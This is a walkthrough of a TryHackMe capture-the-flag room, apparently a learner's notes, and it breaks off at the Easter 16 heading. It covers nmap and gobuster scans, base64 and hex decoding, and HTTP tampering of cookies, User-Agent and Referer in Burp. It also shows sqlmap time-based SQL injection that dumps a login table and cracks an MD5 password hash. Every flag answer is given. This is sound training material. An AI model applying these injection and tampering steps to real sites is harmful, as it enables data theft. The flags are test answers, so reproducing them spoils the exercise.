# CTF Collection volume 2 Walkthrough
### Link
- https://tryhackme.com/room/ctfcollectionvol2
---
### Recon
```
nmap -sC -sC -Pn [IP]
```
**Namp scan result**
```
Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-24 19:48 EDT
Nmap scan report for 10.10.118.69
Host is up (0.098s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 1b:c2:b6:2d:fb:32:cc:11:68:61:ab:31:5b:45:5c:f4 (DSA)
|   2048 8d:88:65:9d:31:ff:b4:62:f9:28:f2:7d:42:07:89:58 (RSA)
|_  256 40:2e:b0:ed:2a:5a:9d:83:6a:6e:59:31:db:09:4c:cb (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/VlNCcElFSWdTQ0JKSUVZZ1dTQm5JR1VnYVNCQ0lGUWdTU0JFSUVrZ1p5QldJR2tnUWlCNklFa2dSaUJuSUdjZ1RTQjVJRUlnVHlCSklFY2dkeUJuSUZjZ1V5QkJJSG9nU1NCRklHOGdaeUJpSUVNZ1FpQnJJRWtnUlNCWklHY2dUeUJUSUVJZ2NDQkpJRVlnYXlCbklGY2dReUJDSUU4Z1NTQkhJSGNnUFElM0QlM0Q=
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: 360 No Scope!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.53 seconds
```
```
 sudo gobuster dir -u http://[IP] -w ~/Documents/Tools/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt
```
**Gobuster scan result**
```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.21.196
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /Users/laurentnebout/Documents/Tools/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/03 12:26:20 Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 94328]
/login                (Status: 301) [Size: 312] [--> http://10.10.21.196/login/]
/button               (Status: 200) [Size: 39148]
/static               (Status: 200) [Size: 253890]
/cat                  (Status: 200) [Size: 62048]
/small                (Status: 200) [Size: 689]
Progress: 1375 / 220561 (0.62%)                                                [ERROR] 2022/04/03 12:27:11 [!] context deadline exceeded (Client.Timeout or context cancellation while reading body)
/robots               (Status: 200) [Size: 430]
/iphone               (Status: 200) [Size: 19867]
/game1                (Status: 301) [Size: 312] [--> http://10.10.21.196/game1/]
/egg                  (Status: 200) [Size: 25557]
/dinner               (Status: 200) [Size: 1264533]
/ty                   (Status: 200) [Size: 198518]
/ready                (Status: 301) [Size: 312] [--> http://10.10.21.196/ready/]
/saw                  (Status: 200) [Size: 156274]
/game2                (Status: 301) [Size: 312] [--> http://10.10.21.196/game2/]
/wel                  (Status: 200) [Size: 155758]
/free_sub             (Status: 301) [Size: 315] [--> http://10.10.21.196/free_sub/]
/nicole               (Status: 200) [Size: 367650]
/server-status        (Status: 403) [Size: 293]
```
---
### Easter 1
*hint*: Check the **/robots**
```
User-agent: * (I don't think this is entirely true, DesKel just wanna to play himself)
Disallow: /VlNCcElFSWdTQ0JKSUVZZ1dTQm5JR1VnYVNCQ0lGUWdTU0JFSUVrZ1p5QldJR2tnUWlCNklFa2dSaUJuSUdjZ1RTQjVJRUlnVHlCSklFY2dkeUJuSUZjZ1V5QkJJSG9nU1NCRklHOGdaeUJpSUVNZ1FpQnJJRWtnUlNCWklHY2dUeUJUSUVJZ2NDQkpJRVlnYXlCbklGY2dReUJDSUU4Z1NTQkhJSGNnUFElM0QlM0Q=


45 61 73 74 65 72 20 31 3a 20 54 48 4d 7b 34 75 37 30 62 30 37 5f 72 30 6c 6c 5f 30 75 37 7d
```
We have an hexadecimal chain. Let's decrypt it.

- Option 1: Use [CyberChef](https://gchq.github.io/CyberChef)
- Option 2 : Command line
```
echo "45 61 73 74 65 72 20 31 3a 20 54 48 4d 7b 34 75 37 30 62 30 37 5f 72 30 6c 6c 5f 30 75 37 7d" | xxd -r -p
Easter 1: THM{4u70b07_r0ll_0u7}
```
**Answer** 
#### THM{4u70b07_r0ll_0u7}
---
### Easter 2
*hint*:Decode the base64 multiple times. Don’t forget there are something being encoded.

**VlNCcElFSWdTQ0JKSUVZZ1dTQm5JR1VnYVNCQ0lGUWdTU0JFSUVrZ1p5QldJR2tnUWlCNklFa2dSaUJuSUdjZ1RTQjVJRUlnVHlCSklFY2dkeUJuSUZjZ1V5QkJJSG9nU1NCRklHOGdaeUJpSUVNZ1FpQnJJRWtnUlNCWklHY2dUeUJUSUVJZ2NDQkpJRVlnYXlCbklGY2dReUJDSUU4Z1NTQkhJSGNnUFElM0QlM0Q=**

- Option 1: Use [CyberChef](https://gchq.github.io/CyberChef)

The pattern is : 
```
1- From Base64
2- URL Code
3- From Base64
4- From Base64
```
We found: **DesKel_secret_base**

Let's check this directory http://[IP]/DesKel_secret_base

Check the **source page**
```
<html>
	<head>
		<title> A slow clap for you</title>
		<h1 style="text-align:center;">A slow clap for you</h1>
	</head>
	
	<body>
	<p style="text-align:center;"><img src="kim.png"/></p>
	<p style="text-align:center;">Not bad, not bad.... papa give you a clap</p>
	<p style="text-align:center;color:white;">Easter 2: THM{f4ll3n_b453}</p>
	</body>

</html>
```
**Answer** 
#### THM{f4ll3n_b453}
---
### Easter 3
*hint*:Directory buster with common.txt might help.

Let's check the **source page** of http://[IP]/login
```
<!DOCTYPE html PUBLIC"-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"
<html>

	<head>
		<meta content="text/html;charset=utf-8" http-equiv="Content-Type">
		<meta content="utf-8" http-equiv="encoding">
		<p hidden>Seriously! You think the php script inside the source code? Pfff.. take this easter 3: THM{y0u_c4n'7_533_m3}</p> 
		<title>Can you find the egg?</title>
		<h1>Just an ordinary login form!</h1>
	</head>
	
	<body>
		
		<p>You don't need to register yourself</p><br><br>
		<form method='POST'>
			Username:<br>
			<input type="text" name="username" required>
			<br><br>
			Password:<br>
			<input type="text" name="password" required>
			<br><br>
			<button name="submit" value="submit">Login</button>
		</form>

			</body>
</html>

```
**Answer** 
#### THM{y0u_c4n'7_533_m3}
---
### Easter 4
*hint*:time-based sqli

Start **Burp Suite** in order to intercept the request. Try to log inand intercept the request
```
POST /login/ HTTP/1.1
Host: 10.10.207.62
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Origin: http://10.10.207.62
Connection: close
Referer: http://10.10.207.62/login/
Upgrade-Insecure-Requests: 1

username=admin&password=admin&submit=submit
```
We noticed the request type: **POST**. Save the request as a text file.Now, we can start **sqlmap** ^^

It is important to be patient. This approach takes few minutes.
```
sqlmap -r ~/Downloads/request.txt --dbs
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.6.2#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:16:37 /2022-04-02/

[19:16:37] [INFO] parsing HTTP request from '/Users/laurentnebout/Downloads/request.txt'
........
[19:18:42] [INFO] retrieved:
[19:18:52] [INFO] adjusting time delay to 3 seconds due to good response times
inform
[19:20:04] [ERROR] invalid character detected. retrying..
[19:20:04] [WARNING] increasing time delay to 4 seconds
ation_schema
[19:22:46] [INFO] retrieved: THM_f0und_m3
.......
```
We found the database name **THM_f0und_m3**. Now, it's time to dump the DB ^^
```
sqlmap -r ~/Downloads/request.txt -D THM_f0und_m3 --tables

        ___
       __H__
 ___ ___["]_____ ___ ___  {1.6.2#stable}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:44:41 /2022-04-02/

[19:44:41] [INFO] parsing HTTP request from '/Users/laurentnebout/Downloads/request.txt'
......
[19:47:18] [INFO] the back-end DBMS is MySQL
[19:47:18] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
web server operating system: Linux Ubuntu 12.10 or 13.04 or 12.04 (Raring Ringtail or Quantal Quetzal or Precise Pangolin)
web application technology: Apache 2.2.22, PHP 5.3.10
back-end DBMS: MySQL >= 5.0.12
[19:47:18] [INFO] fetching tables for database: 'THM_f0und_m3'
[19:47:18] [INFO] fetching number of tables for database 'THM_f0und_m3'
[19:47:19] [INFO] retrieved:
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
2
[19:47:39] [INFO] retrieved: nothing_inside
[19:52:04] [INFO] retrieved: user
Database: THM_f0und_m3
[2 tables]
+----------------+
| user           |
| nothing_inside |
+----------------+

```
We found tables. Let's try each.
```
sqlmap.py -r ~/Downloads/request.txt  -D THM_f0und_m3 -T nothing_inside --columns


        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.6.2#stable}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:52:44 /2022-04-02/

[19:52:44] [INFO] parsing HTTP request from '/Users/laurentnebout/Downloads/request.txt'
[19:52:44] [WARNING] unable to write to the output directory '/Users/laurentnebout/.local/share/sqlmap/output' ([Errno 13] Permission denied: '/Users/laurentnebout/.local/share/sqlmap/output/rUEb'). Using temporary directory '/var/folders/dj/0j
..........
[19:56:04] [INFO] retrieved: varchar(30)
Database: THM_f0und_m3
Table: nothing_inside
[1 column]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| Easter_4 | varchar(30) |
+----------+-------------+

[19:57:24] [INFO] fetched data logged to text files under '/var/folders/dj/0jhmdqp10lj1ql8htw2f8g900000gn/T/sqlmapoutput9uxpf5cl/10.10.207.62'

```
Because we found only one field, we can easily guess we will find the flag inside. 
```
sqlmap -r ~/Downloads/request.txt -D THM_f0und_m3 -T nothing_inside -C Easter_4 --sql-query "select Easter_4 from nothing_inside"
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.6.2#stable}
|_ -| . [,]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:58:19 /2022-04-02/

[19:58:19] [INFO] parsing HTTP request from '/Users/laurentnebout/Downloads/request.txt'
.....
select Easter_4 from nothing_inside: 'THM{1nj3c7_l1k3_4_b055}'
[20:07:32] [INFO] fetched data logged to text files under '/var/folders/dj/0jhmdqp10lj1ql8htw2f8g900000gn/T/sqlmapoutputcu_7nz4v/10.10.207.62'

[*] ending @ 20:07:32 /2022-04-02/
```
**Answer** 
#### THM{1nj3c7_l1k3_4_b055}
---
### Easter 5
*hint*:Another sqli

Now , let's check the table **user**
```
sqlmap.py -r ~/Downloads/request.txt -D THM_f0und_m3 -T user --columns

        ___
       __H__
 ___ ___["]_____ ___ ___  {1.6.2#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:07:53 /2022-04-02/

[20:07:53] [INFO] parsing HTTP request from '/Users/laurentnebout/Downloads/request.txt'
[20:07:53] [WARNING] unable to write to the output directory '/Users/laurentnebout/.local/share/sqlmap/output' ([Errno 13] Permission denied: '/Users/laurentnebout/.local/share/sqlmap/output/QmmU'). Using temporary directory '/var/folders/dj/0jhmdqp10lj1ql8htw2f8g900000gn/T/sqlmapoutputec6ov6w2' instead
........
Database: THM_f0und_m3
Table: user
[2 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| password | varchar(40) |
| username | varchar(30) |
+----------+-------------+

[20:14:11] [INFO] fetched data logged to text files under '/var/folders/dj/0jhmdqp10lj1ql8htw2f8g900000gn/T/sqlmapoutputec6ov6w2/10.10.207.62'

[*] ending @ 20:14:11 /2022-04-02/
```
Let's try to find a valid username and password ^^
```
sqlmap -r ~/Downloads/request.txt -D THM_f0und_m3 -T user -C username,password --sql-query "select username,password from user"

        ___
       __H__
 ___ ___[']_____ ___ ___  {1.6.2#stable}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:20:37 /2022-04-02/

[20:20:37] [INFO] parsing HTTP request from '/Users/laurentnebout/Downloads/request.txt'
[20:20:37] [WARNING] unable to write to the output directory '/Users/laurentnebout/.local/share/sqlmap/output' ([Errno 13] Permission denied: '/Users/laurentnebout/.local/share/sqlmap/output/FVIx'). Using temporary directory '/var/folders/dj/0jhmdqp10lj1ql8htw2f8g900000gn/T/sqlmapoutputciyn_mgt' instead
.........
[20:31:13] [ERROR] invalid character detected. retrying..
[20:31:13] [WARNING] increasing time delay to 4 seconds
ce guy, say hello for me
select username,password from user [2]:
[*] DesKel, 05f3672ba34409136aa71b8d00070d1b
[*] Skidy, He is a nice guy, say hello for me

[20:37:26] [INFO] fetched data logged to text files under '/var/folders/dj/0jhmdqp10lj1ql8htw2f8g900000gn/T/sqlmapoutputciyn_mgt/10.10.207.62'

[*] ending @ 20:37:26 /2022-04-02/
```

Now we cand try to decrypt the **password** of **DesKel**.
- First: Go to [Hash analyzer](https://www.tunnelsup.com/hash-analyzer/). We found this hash is **MD4** or **MD5**
- Second: Go to [MD5 hashing website](https://md5hashing.net/) and decrypt it
	- Result: **cutie**
- Third: On the login page try the combo **DesKel / Cutie**
**Answer** 
#### THM{wh47_d1d_17_c057_70_cr4ck_7h3_5ql} 
---
### Easter 6
*hint*:Look out for the response header.
```
curl -s 10.10.207.62 -D header.txt
```
Check the **header.txt**
```
cat header.txt
HTTP/1.1 200 OK
Date: Sun, 03 Apr 2022 00:42:13 GMT
Server: Apache/2.2.22 (Ubuntu)
X-Powered-By: PHP/5.3.10-1ubuntu3.26
Busted: Hey, you found me, take this Easter 6: THM{l37'5_p4r7y_h4rd}
Set-Cookie: Invited=0
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/html
```
**Answer** 
#### THM{l37'5_p4r7y_h4rd}
---
### Easter 7
*hint*:Cookie is delicious

Let's continue to use **Burp**. 
- First: Launch **Burp**
- Second: Go to http://[IP]/ and start to intercept request. The interesting request is **GET**
```
GET / HTTP/1.1
Host: 10.10.21.196
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: Invited=0
Upgrade-Insecure-Requests: 1
```
- Third: We haave into this request the **Cookie** paramter. Send it to **repeater**
- Fourth: From **repeater**, change the value of **Cookie invited** from **0** to **1** andforward the request
```
GET / HTTP/1.1
Host: 10.10.21.196
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: Invited=1
Upgrade-Insecure-Requests: 1
```
```
X-Powered-By: PHP/5.3.10-1ubuntu3.26
Busted: Hey, you found me, take this Easter 6: THM{l37'5_p4r7y_h4rd}
Vary: Accept-Encoding
Connection: close
Content-Type: text/html
Content-Length: 94376

<!DOCTYPE html>
<html>
		<head>
		<title>360 No Scope!</title>
		<h1>Let's get party! Erm....mmmmmmmmmmm</h1>
		<script src="jquery-9.1.2.js"></script>
		 <style>
			body {
  				background-image: url('static.gif');
				}
		</style> 
		<img src="rainbow-frog.gif"/><img src="rainbow-frog.gif"/><img src="rainbow-frog.gif"/>
	</head>

	<body>
		<h2>DID you know: Banging your head against a wall for one hour burns 150 calories.</h2>
					<p><img src="wel.gif"/></p>
			<h2> You are now officially invited. Enjoy the easter 7: THM{w3lc0m3!_4nd_w3lc0m3} 
```
**Answer** 
#### THM{w3lc0m3!_4nd_w3lc0m3} 
---
### Easter 8
*hint*:Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1

Still with **Burp** and based on the **hint**, we need to change the **User-Agent** to find the flag 8.

For that, we just need to intercept the request when we click on the iPhone picture and change 2 parameters

- First: Cookie: Invited must be **1**
- Second : User-agent

```
GET / HTTP/1.1
Host: 10.10.21.196
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: Invited=1
Upgrade-Insecure-Requests: 1
```
```
<p>Psst....psst.. hey dude.......do you have extra cash</p>
	<p>Please buy me one iphone 11....I'm poor, link down below.</p>
			<h4>You are Rich! Subscribe to THM server ^^ now. Oh btw, Easter 8: THM{h3y_r1ch3r_wh3r3_15_my_k1dn3y} 
		<a href="https://www.apple.com/iphone-11/"><img src="iphone.jpg"/></a>
	<br>
```
**Answer** 
#### THM{h3y_r1ch3r_wh3r3_15_my_k1dn3y} 
---
### Easter 9
*hint*:Something is redirected too fast. You need to capture it.

I was really lucky to find it ^^;  I intercepted the request when I tried to push the red button from the Main page. I found the **Easter 13**. But not the **Easter 9**. I navigated into the tab **Target** in **Burp** and check the **response** page **/ready/**.... I found the **Easter 9** ^^v
```
HTTP/1.1 200 OK
Date: Sun, 03 Apr 2022 17:01:06 GMT
Server: Apache/2.2.22 (Ubuntu)
X-Powered-By: PHP/5.3.10-1ubuntu3.26
Vary: Accept-Encoding
Content-Length: 276
Connection: close
Content-Type: text/html

<html>
	<head>
		<title>You just press it</title>
		<meta http-equiv="refresh" content="3;url=http:gone.php" />
		<p style="text-align:center"><img src="bye.gif"/></p>
		<!-- Too fast, too good, you can't catch me. I'm sanic Easter 9: THM{60nn4_60_f457} -->
	</head>

</html>

```
**Answer** 
#### THM{60nn4_60_f457}
---
### Easter 10
*hint*:Look at THM URL without https:// and use it as a referrer.

Initial Request
```
GET /free_sub/ HTTP/1.1
Host: 10.10.21.196
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.21.196/
Connection: close
Cookie: Invited=0
Upgrade-Insecure-Requests: 1
```
Initial Reponse
```
HTTP/1.1 200 OK
Date: Sun, 03 Apr 2022 17:13:55 GMT
Server: Apache/2.2.22 (Ubuntu)
X-Powered-By: PHP/5.3.10-1ubuntu3.26
Vary: Accept-Encoding
Content-Length: 65
Connection: close
Content-Type: text/html

only people came from tryhackme are allowed to claim the voucher.
```
Let's change the **Referer** value from the **Request**. We try to specify the Tryhackme url.

New Request 
```
GET /free_sub/ HTTP/1.1
Host: 10.10.21.196
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: tryhackme.com
Connection: close
Cookie: Invited=1
Upgrade-Insecure-Requests: 1
```

New Response
```
HTTP/1.1 200 OK
Date: Sun, 03 Apr 2022 17:15:31 GMT
Server: Apache/2.2.22 (Ubuntu)
X-Powered-By: PHP/5.3.10-1ubuntu3.26
Vary: Accept-Encoding
Content-Length: 118
Connection: close
Content-Type: text/html

Nah, there are no voucher here, I'm too poor to buy a new one XD. But i got an egg for you. Easter 10: THM{50rry_dud3}
```

**Answer** 
#### THM{50rry_dud3}
---
### Easter 11
*hint*:Temper the html

For this ine, we continue into the main page. we have the menu selection. **Burp Time** ^^

Initial Request
```
POST / HTTP/1.1
Host: 10.10.21.196
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Origin: http://10.10.21.196
Connection: close
Referer: http://10.10.21.196/
Cookie: Invited=0
Upgrade-Insecure-Requests: 1

dinner=DesKel&submit=submit
```
Initial Response : nothing. I tried all option available and nothing really relevant. One informaiton we cna catch from the main page if we scroll down is many **eggs** pictures. I send the request to **Repeater** and add **egg** for the dinner value and send the new crafted request
```
POST / HTTP/1.1
Host: 10.10.21.196
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: http://10.10.21.196
Connection: close
Referer: http://10.10.21.196/
Cookie: Invited=0
Upgrade-Insecure-Requests: 1

dinner=egg&submit=submit
```

New Response
```
</form>

	You found the secret menu, take the easter 11: THM{366y_b4k3y}	<h1 style="color:red"">Press this button if you wishes to watch the world burn!!!!!!!!!!!!!!!!<h1>
	<a href="/ready"><p style="text-align:center"><img src="button.gif"/></p></a> 
```
**Answer** 
#### THM{366y_b4k3y}
---
### Easter 12
*hint*:Fake js file

For this one, we just need to analyze the page and find the **jquery-9.1.2.js**. With the Developer tool, we can check with Javascript source and :
```
function ahem()
 {
	str1 = '4561737465722031322069732054484d7b68316464336e5f6a355f66316c337d'
	var hex  = str1.toString();
	var str = '';
	for (var n = 0; n < hex.length; n += 2) {
		str += String.fromCharCode(parseInt(hex.substr(n, 2), 16));
	}
	return str;
 }
```
Now we have the function called **ahem**. A great feature from Firefox is , from the Develper tools, the tab **Console**. We just click on **Console** tab and call the **ahem** function
```
ahem()
"Easter 12 is THM{h1dd3n_j5_f1l3}"
```
**Answer** 
#### THM{h1dd3n_j5_f1l3}
---
### Easter 13

About this flag, I found it during the Easter 9 step ^^
**Answer** 
#### THM{1_c4n'7_b3l13v3_17}
---
### Easter 14
*hint*:Embed image code

I remembered one thing. I saw something related to **easter 14** from previous request captured. Let's do one more time with **Burp**. Catch the request from the main page.
```
	<!--Easter 14<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAyAAAAMgCAYAAADbcAZoAAAgAElEQVR4nOzdeXwU9f0/cAnQn4/6aG1mZjcJIZzhEgEBQUXEAxFB8UCLRdRaW/A+KPWoftV6FGqrgndVvKqo9aiteFWLmr0390Egd0IgIfd97u7M6/fHzCabC5Ldze4m+3o+HvMolbCZz+xk83nN5/N5f04AERERERFRgJwQ7BMgIiIiIqLwwQBCREREREQBwwBCREREREQBwwBCREREREQBwwBCREREREQBwwBCREREREQBwwBCREREREQBwwBCREREREQBwwBCREREREQBwwBCREREREQBwwBCREREREQBwwBCREREREQBwwBCREREREQBwwBCREREREQBwwBCREREREQBwwBCREREREQBwwBCREREREQBwwBCREREREQBwwBC
	....................AAAANYQQAAAAABYQwABAAAAYA0BBAAAAIA1BBAAAAAA1hBAAAAAAFhDAAEAAABgDQEEAAAAgDUEEAAAAADWEEAAAAAAWEMAAQAAAGANAQQAAACANQQQAAAAANYQQAAAAABYQwABAAAAYA0BBAAAAIA1BBAAAAAA1hBAAAAAAFhDAAEAAABgDQEEAAAAgDUEEAAAAADWEEAAAAAAWEMAAQAAAGANAQQAAACANQQQAAAAANYQQAAAAABYQwABAAAAYA0BBAAAAIA1BBAAAAAA1hBAAAAAAFhDAAEAAABgDQEEAAAAgDUEEAAAAADWEEAAAAAAWEMAAQAAAGANAQQAAACANQQQAAAAANYQQAAAAABYQwABAAAAYA0BBAAAAIA1BBAAAAAA1hBAAAAAAFhDAAEAAABgDQEEAAAAgDUEEAAAAADWEEAAAAAAWEMAAQAAAGANAQQAAACANQQQAAAAANYQQAAAAABYQwABAAAAYA0BBAAAAIA1BBAAAAAA1hBAAAAAAFhDAAEAAABgDQEEAAAAgDUEEAAAAADWEEAAAAAAWEMAAQAAAGANAQQAAACANQQQAAAAANYQQAAAAABYQwABAAAAYA0BBAAAAIA1BBAAAAAA1hBAAAAAAFhDAAEAAABgDQEEAAAAgDUEEAAAAADWEEAAAAAAWEMAAQAAAGANAQQAAACANQQQAAAAANYQQAAAAABYQwABAAAAYA0BBAAAAIA1BBAAAAAA1hBAAAAAAFhDAAEAAABgDQEEAAAAgDUEEAAAAADWEEAAAAAAWEMAAQAAAGANAQQAAACANQQQAAAAANYQQAAAAABYQwABAAAAYA0BBAAAAIA1BBAAAAAA1vw/7iizQXzAvG0AAAAASUVORK5CYII="/> --> 
```
Now we can use [CyberChef](https://gchq.github.io/CyberChef) to decrypt that.

Into Cyberchef, we select:
- First : From Base64
- Second : Render Image

**Answer** 
#### THM{d1r3c7_3mb3d}
---
### Easter 15
*hint*:Try guest the alphabet and the hash code

Now, we move to the Game1. We have a hints : 51 89 77 93 126 14 93 10. We can assume , we need decrypt this hint and put our answer in the field to obtain the flag.

I have spent a lot of time to understand the system and I finally understand that:

abc --> 89 90 91

abcdefghijklmnopqrstuvwxyz -->  89 90 91 92 93 94 95 41 42 43 75 76 77 78 79 80 81 10 11 12 13 14 15 16 17 18

So, based on the **hints** 

51 --> ???

89 --> a

77 --> m

93 --> e

126 --> ???

14 --> v

93 --> e

10 --> r

We still need to find 2 characters. Let's try the Ipper case alphabet 

ABCDEFGHIJKLMNOPQRSTUVWXYZ -->  99 100 101 102 103 104 51 52 53 54 55 56 57 58 126 127 128 129 130 131 136 137 138 139 140 141

51 --> G

126 --> O

The code is : GameOver 

**Answer** 
#### THM{ju57_4_64m3} 
---
### Easter 16
*hint*:Make all inputs into one form.


